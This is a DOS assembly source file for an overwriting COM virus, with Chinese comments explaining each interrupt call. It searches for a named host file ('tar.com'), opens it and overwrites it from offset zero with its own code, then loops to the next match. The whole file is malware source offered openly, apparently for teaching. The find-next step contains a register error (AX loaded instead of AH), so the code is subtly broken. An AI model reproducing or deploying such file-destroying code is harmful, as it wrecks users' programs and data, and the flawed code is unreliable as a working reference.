;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;	最简单COM覆盖型病毒
;	virus_overwrite.asm
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
.model tiny
.code
org 100h
start:
setdta:	;设置DTA
		lea dx,dta		;将DTA的起始地址赋给dx
		mov ah,1ah		;1ah功能调用，设置DTA地址，调用参数 ds:dx=DTA地址
		int 21h			;DOS中断调用
findf:	;查找文件
		mov ah,4eh		;4eh功能调用，查找匹配文件，参数 ds:dx=ASCII串地址，cx属性
		lea dx,fname	;将文件名地址赋给dx
		mov cx,7		;指定查找文件类型，7表示查找所有文件
nextf:	int 21h			;DOS中断调用
		jc	notfind		;处理没有找到文件，jc是当CF=1时跳转
dispfn:	;显示文件
		lea dx,[dta+30]	;打印文件，位置在它偏移30个字节的地方
		push ax			;这里要使用ax，保存之前ax中内用
		mov ah,09h		;09h号功能调用，显示字符串，调用参数 ds:dx=串地址，字符串以'$'结尾
		int 21h			;DOS中断调用
		pop ax			;还原ax内容
openf:	;打开文件	
		mov ax,3d02h	;3dh功能调用，调用参数 ds:dx=ASCII串地址，al=访问文件共享方式，0=读，1=写，2=读/写
						;若调用成功，返回参数ax=文件句柄
		;此处设置DX指向要操作的文件名，因为上面显示文件功能已经
		;设置了DX的指向，这里就不用再次设置了
		int 21h			;DOS中断调用
		jc notopen		;当CF=1时文件没有打开跳转到notopen
		xchg ax,bx		;将打开文件功能调用的出口参数（文件句柄）
pointf:	;定义文件读写指针
		mov ax,4200h	;42h功能调用，移动文件指针，调用参数bx=文件代号，cx:dx=位移量，al=移动方式
		xor cx,cx		;将cx清零，代表偏移量的高位
		xor dx,dx		;将dx清零，代表偏移量的低位
		int 21h			;DOS中断调用，偏移量都为零，说明从文件的最开始处覆盖，若成功 dx:ax=新指针位置；失败则 ax=错误码
		jc	notpoint	;当CF=1时设置错误就跳转到notpoint
		mov filesize,ax	;将文件的大小赋到内存单元中，ax是42号功能调用的出口参数
writef:	;写文件
		mov ah,40h		;40h调用，写文件或设备，ds:dx=数据缓冲区地址，bx=文件代号，cx=写入的字节数；若调用成功返回ax=实际实际写入的字节数
		mov cx,filelen	;把要写入文件的长度保存到cx中（病毒自身长度）
		lea	dx,start	;将病毒的起始地址存到dx当中
		int 21h			;DOS中断调用
		jc	notwrite	;当CF=1写入文件失败跳转到notwrite
closef:	;关闭文件
		mov ah,3eh		;3eh功能调用，关闭文件，bx=文件句柄
		int 21h			;DOS中断
		jc notclose		;当CF=1时文件关闭失败跳转到notclose
findnext:;查找下一个文件
		mov ax,4fh		;4fh调用，查找下一匹配文件，调用参数 DAT保留4eh的原始信息
		jmp	nextf		;跳回继续查找文件

notfind:
notopen:
notpoint:
notwrite:
notclose:
quit:	;退出程序
			mov ah,4ch	;4ch调用，带返回码终止，参数 al=返回码
			int 21h
			
 dta		db	44	dup(0)	;定义一个44字节的缓冲区
			db	'$'			;字符串的结束符，9号功能调用要用到
 fname		db	'tar.com'	;感染宿主程序名
 filesize	dw	?			;宿主程序文件长度
 filelen	equ	$-start		;当前的偏移量($(已经到了文件的末尾了))-病毒的起始偏移量(start)
 end start
;关于DTA结构
;DTA STRUCT
;	Res DB 21 DUP (?)
;	Attrib DB ?
;	Time DW ?
;	Date DW ?
;	Bytes DD ?
;	Name DB 12 DUP (?),0
;DTA ENDS